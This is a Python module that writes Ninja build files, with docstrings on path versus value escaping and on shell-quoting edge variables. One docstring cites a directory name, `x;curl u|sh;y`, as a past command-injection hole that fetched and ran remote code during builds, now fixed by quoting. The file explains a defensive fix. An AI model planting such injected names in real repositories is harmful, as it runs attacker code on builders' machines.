r"""
A minimal `build.ninja` writer.

Ninja's own `misc/ninja_syntax.py` is the canonical version of this and is about the same size;
it is vendored here rather than depended on because `ninja` is a *build-time* tool for this
repository, not a Python dependency, and `pyproject.toml` should not gain one for 60 lines.

The only subtlety is escaping, and there are two different rules. In a **path** (an output or an
input) Ninja takes `$ ` for a space, `$:` for a colon and `$$` for a dollar. In a **value** (the
right-hand side of `command = …`) only `$` and the newline are special. Getting the two confused
is how a path with a space in it silently becomes two paths.
"""
import shlex
import textwrap


def escape_path(word: str) -> str:
    return word.replace('$ ', '$$ ').replace(' ', '$ ').replace(':', '$:')


def escape(value: str) -> str:
    return value.replace('$', '$$')


def shell_value(key: str, value) -> str:
    r"""
    One edge variable, safe to drop into the command `/bin/sh` is handed.

    **Ninja escapes `$in` and `$out` and nothing else.** Every other variable is substituted into
    the command line verbatim, and this graph binds source-derived paths to a dozen of them --
    `$meta`, `$tex`, `$outdir`, `$problem`, `$venue`, `$course`. Directory names come out of
    content repositories several people push to, so a problem directory called `x;curl u|sh;y`
    used to be a command on the machine of anyone who ran `./dgs-build` after pulling. That is
    the whole exploit: no editor, no browser, no `-shell-escape`.

    It is also the *careless* case, and that is the half that would have been met first. A venue
    named `Martin's school` or `Fyzika & chémia` produced a command line that broke somewhere
    deep in a shell with no indication of which name did it.

    The order of the two escapes matters. `shlex.quote` first, so the shell sees one word; then
    `$` → `$$`, because Ninja would otherwise read a `$` *inside* our quotes as the start of one
    of its own variables. Ninja unescapes it back to a literal `$` inside single quotes, which
    the shell then leaves alone.

    **Nothing may quote these a second time.** Six rules used to write `-o '$outdir'`, putting
    literal quotes round a value that is now quoted already. On an ordinary path the two layers
    cancel and the command runs, which is why the whole graph still built; on the very name this
    function exists for -- a venue called `Martin's school`, whose quoting is
    `'Martin'"'"'s school'` -- the outer pair closes early and the shell sees an unterminated
    string. Quote here, once, and write `$outdir` bare in the rule.

    `shlex.quote` is a no-op on anything matching `[\w@%+=:,./-]`, so an ordinary ASCII path is
    emitted exactly as before. What does change is a path with a non-ASCII character in it --
    `source/naboj/chem/01/problems/cínový-mor` and its kind -- which now arrives quoted. That is
    correct and has always been needed; it was simply never unsafe enough to notice.
    """
    text = str(value)
    if not text:
        return text
    return escape(shlex.quote(text))


class Writer:
    def __init__(self, out, width: int = 100):
        self.out = out
        self.width = width
        #: Every output written so far, to the edge that wrote it. Ninja refuses two rules for
        #: one output -- `multiple rules generate …` -- and it is right to: make resolved the
        #: same ambiguity silently by taking whichever rule it saw last, which is how its
        #: picture rules came to carry the same head twice with the second unreachable.
        #:
        #: Benign repetition is real here, though. Two gnuplot scripts in one directory share a
        #: `.dat`, so the same copy edge is reached twice; that is the identical edge and is
        #: skipped. A *different* edge for the same output is a generator bug and raises.
        self.emitted: dict[str, str] = {}

    def comment(self, text: str) -> None:
        for line in textwrap.wrap(text, self.width - 2, break_long_words=False,
                                  break_on_hyphens=False):
            self.out.write(f'# {line}\n')

    def newline(self) -> None:
        self.out.write('\n')

    #: Edge variables whose value is deliberately **several** shell words, and which therefore
    #: cannot be quoted as one. `paths` is `build render output` for `distclean`; `flags` is
    #: `--delete` or the empty string, which must expand to nothing rather than to `''`; `scope`
    #: is the whole scope list handed to `--scope`; `files` is a page's section order, handed to
    #: `--files`. Every other edge variable is a single token -- almost always a path out of
    #: `source/` -- and is quoted by `build()`.
    #:
    #: Each of these is **ours**: a literal, a scope name the generator enumerated, or a target
    #: name out of a module descriptor. None of them is a path from a content repository, which
    #: is what the quoting exists for.
    UNQUOTED = frozenset({'paths', 'flags', 'scope', 'files'})

    def variable(self, key: str, value, indent: int = 0) -> None:
        if value is None:
            return
        if isinstance(value, (list, tuple)):
            value = ' '.join(str(v) for v in value if v)
        self.out.write(f"{'  ' * indent}{key} = {value}\n")

    def pool(self, name: str, depth: int) -> None:
        self.out.write(f'pool {name}\n')
        self.variable('depth', depth, 1)

    KNOWN = ('description', 'depfile', 'deps', 'pool', 'generator', 'restat')

    def rule(self, name: str, command: str, **kwargs) -> None:
        """
        A rule block takes only the bindings Ninja knows -- an arbitrary one is a parse error,
        `unexpected variable 'kind'`, not something it ignores. So a `$kind` in a description
        has to be bound by every edge that uses the rule, and the whitelist here is what turns
        a misspelt keyword into an error at generation time rather than a silent omission.
        """
        if unknown := set(kwargs) - set(self.KNOWN):
            raise TypeError(f'rule {name}: unknown {", ".join(sorted(unknown))}')
        self.out.write(f'rule {name}\n')
        self.variable('command', command, 1)
        for key in self.KNOWN:
            if key in kwargs:
                self.variable(key, kwargs[key], 1)

    def build(self, outputs, rule: str, inputs=None, *, implicit=None, order_only=None,
              implicit_outputs=None, variables=None) -> list:
        outputs = [escape_path(str(o)) for o in _listify(outputs)]
        line = f"build {' '.join(outputs)}"
        if implicit_outputs:
            line += ' | ' + ' '.join(escape_path(str(o)) for o in _listify(implicit_outputs))
        line += f': {rule}'
        for prefix, items in ((' ', inputs), (' | ', implicit), (' || ', order_only)):
            items = [escape_path(str(i)) for i in _listify(items)]
            if items:
                line += prefix + ' '.join(items)
        signature = line + ''.join(f'|{k}={v}' for k, v in sorted((variables or {}).items()))
        first = outputs[0]
        if (previous := self.emitted.get(first)) is not None:
            if previous == signature:
                return []                   # the same edge reached twice; write it once
            raise ValueError(f'two different edges produce {first}:\n  {previous}\n  {signature}')
        for output in outputs:
            self.emitted[output] = signature

        self.out.write(line + '\n')
        for key, value in (variables or {}).items():
            self.variable(key, shell_value(key, value) if key not in self.UNQUOTED else value, 1)
        return outputs


    def default(self, targets) -> None:
        """
        What `ninja` with no arguments builds.

        Ninja's own default is every output nothing else depends on, which here is 33 929 of
        them -- the whole repository, every preview PDF included. `make` with no goal touched a
        stamp and stopped, so the two spellings of "I typed the command to see what happens"
        must not differ by four hours of xelatex.
        """
        self.out.write('default ' + ' '.join(escape_path(t) for t in _listify(targets)) + '\n')


    def has(self, output: str) -> bool:
        """Whether something already produces this path."""
        return escape_path(str(output)) in self.emitted


def _listify(value) -> list:
    if value is None:
        return []
    if isinstance(value, (list, tuple, set)):
        return sorted(value) if isinstance(value, set) else list(value)
    return [value]
